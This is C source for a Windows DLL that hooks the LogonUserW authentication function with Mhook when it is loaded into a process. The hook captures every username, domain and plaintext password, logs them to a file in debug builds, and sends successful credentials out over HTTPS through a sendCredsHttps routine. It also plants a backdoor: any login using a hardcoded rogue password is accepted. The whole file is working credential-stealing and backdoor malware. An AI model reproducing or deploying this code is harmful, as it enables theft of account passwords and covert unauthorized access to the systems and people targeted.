#include "dllmain.h"

// Define _LogonUserW so we can dynamically bind to the function
typedef BOOL (*_LogonUserW)(LPCWSTR, LPCWSTR, LPCWSTR, DWORD, DWORD, PHANDLE);

_LogonUserW TrueLogonUserW = NULL;


BOOL HookLogonUserW(LPCWSTR lpszUsername, LPCWSTR lpszDomain, LPCWSTR lpszPassword, DWORD   dwLogonType, DWORD   dwLogonProvider, PHANDLE phToken){
	BOOL isAuthSucess = TrueLogonUserW(lpszUsername, lpszDomain, lpszPassword, dwLogonType, dwLogonProvider, phToken);

#ifdef DEBUG
	
	if(isAuthSucess){
		log_to_file("[+] Username: %ls Domaine: %ls Password: %ls",lpszUsername, lpszDomain, lpszPassword);
	}else{
		log_to_file("[-] Username: %ls Domaine: %ls Password: %ls",lpszUsername, lpszDomain, lpszPassword);
	}

#endif

#ifdef HTTPS_EXFILTRATION 

	if(isAuthSucess){
		sendCredsHttps((LPWSTR)lpszUsername, (LPWSTR)lpszPassword, (LPWSTR)lpszDomain);
	}
		
#endif

	// int number_of_hours_wasted_here = 4;
	// If you try to understand what's going on here, update the counter after you failed understanding the deep shit
	// going around here.
	// probably call convention issue 

	return TrueLogonUserW(lpszUsername, lpszDomain, lpszPassword, dwLogonType, dwLogonProvider, phToken) || (BOOL)(wcscmp(PSTR_TO_PWSTR(ROGUE_PASSWORD), lpszPassword) == 0);
}

BOOL SetupLogonUserWHook(){
	if(TrueLogonUserW == NULL){
		TrueLogonUserW = (_LogonUserW)GetProcAddress(GetModuleHandleA("advapi32.dll"), "LogonUserW");
	}
	
	return Mhook_SetHook((PVOID*)&TrueLogonUserW, (PVOID)HookLogonUserW);
}

BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved )
{
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
			
#ifdef DEBUG
			if(SetupLogonUserWHook()){
				log_to_file("[+] Patched LogonUserW address 0x%p",TrueLogonUserW);
			}else{
				log_to_file("[-] Error while setup Hook on LogonUserW");
			}
#else
			SetupLogonUserWHook();
#endif

            break;

        case DLL_THREAD_ATTACH:
            break;

        case DLL_THREAD_DETACH:
            break;

        case DLL_PROCESS_DETACH:
			Mhook_Unhook((PVOID*)&TrueLogonUserW);
			TrueLogonUserW = NULL;
#ifdef DEBUG
			log_to_file("[+] UnHook Successfully");
#endif
            break;
    }

    return TRUE;
}